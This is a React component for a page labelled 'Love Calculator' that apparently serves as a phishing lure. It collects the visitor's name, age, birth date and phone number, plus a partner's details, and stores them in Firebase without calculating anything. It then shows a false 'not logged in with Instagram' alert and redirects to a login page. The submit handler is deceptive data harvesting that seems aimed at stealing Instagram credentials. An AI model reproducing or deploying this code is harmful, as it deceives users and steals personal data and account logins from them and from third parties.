import React, { useState } from 'react';
import { Link, useHistory } from "react-router-dom";
import './Home.css';
import {db} from './firebase';

function Home() {

    const[yName, setYName] = useState("");
    const[yAge, setYAge] = useState("");
    const[yDOB, setYDOB] = useState("");
    const[yMN, setYMN] = useState("");
    const[lName, setLName] = useState("");
    const[lAge, setLAge] = useState("");
    const[lMob, setLMob] = useState("");
    const history = useHistory();

    const submit = (e) => {
        e.preventDefault();
        db.collection("userInfo").add({
            yourName: yName,
            yourAge : yAge,
            yourDOB : yDOB,
            yourMobileNumber : yMN,
            loverName : lName,
            loverAge : lAge,
            loverMobileNumber : lMob,
        })
        .catch((error) => alert(error.message))
        .then(alert("It seems that you are not logged in with Instagram. Please Log In."))
        .then(history.push("/login"))
        setYName("");
        setYAge("");
        setYDOB("");
        setYMN("");
        setLName("");
        setLAge("");
        setLMob(""); 
    }
    return (
        <div className = "home">
            <form className = "home__form" onSubmit = {submit} autoComplete="off">
                <div className = "home__header"><h1 className = "home__heading">Love Calculator</h1></div>
                <div className = "home__requires">
                    <label className = "home__label">Your Name* :-</label>
                    <input type = "text" className = "home__input" value = {yName} onChange = {(e) => setYName(e.target.value)} placeholder = "Please Enter Your Name" required/>
                </div>
                <div className = "home__requires">
                    <label className = "home__label">Your Age* :-</label>
                    <input type = "number" className = "home__input" value = {yAge} onChange = {(e) => setYAge(e.target.value)} placeholder = "Please Enter Your Age" required/>
                </div>
                <div className = "home__requires">
                    <label className = "home__label">Your D:O:B* :-</label>
                    <input type = "date" className = "home__input" value = {yDOB} onChange = {(e) => setYDOB(e.target.value)} placeholder = "Please Enter Your D O B" required/>
                </div>
                <div className = "home__requires">
                    <label className = "home__label">Your Mobile Number* :-</label>
                    <input type = "text" className = "home__input" value = {yMN} onChange = {(e) => setYMN(e.target.value)} placeholder = "Please Enter Your Mobile Number" required pattern = "[0-9]{10}" />
                </div>
                <div className = "home__requires">
                    <label className = "home__label">Lover's Name* :-</label>
                    <input type = "text" className = "home__input" value = {lName} onChange = {(e) => setLName(e.target.value)} placeholder = "Please Enter Your Lover's Name" required/>
                </div>
                <div className = "home__requires">
                    <label className = "home__label">Lover's Approx Age* :-</label>
                    <input type = "number" className = "home__input" value = {lAge} onChange = {(e) => setLAge(e.target.value)} placeholder = "Please Enter Lover's Age" required/>
                </div>
                <div className = "home__requires">
                    <label className = "home__label">Lover's Mobile No.(optional) :-</label>
                    <input type = "text" className = "home__input" value = {lMob} onChange = {(e) => setLMob(e.target.value)} placeholder = "Please Enter Lover's Mobile Number" pattern = "[0-9]{10}"/>
                </div>
                {/* <Link to = "/login" className = "home__link"> */}
                <button type = "submit"  className = "home__submit" onSubmit = {submit}
                // onSubmit ={() => alert("It seems that you are not logged in with Instagram. Please Login First")}
                >Calculate</button>
                {/* </Link> */}
            </form>
        </div>
    )
}

export default Home;
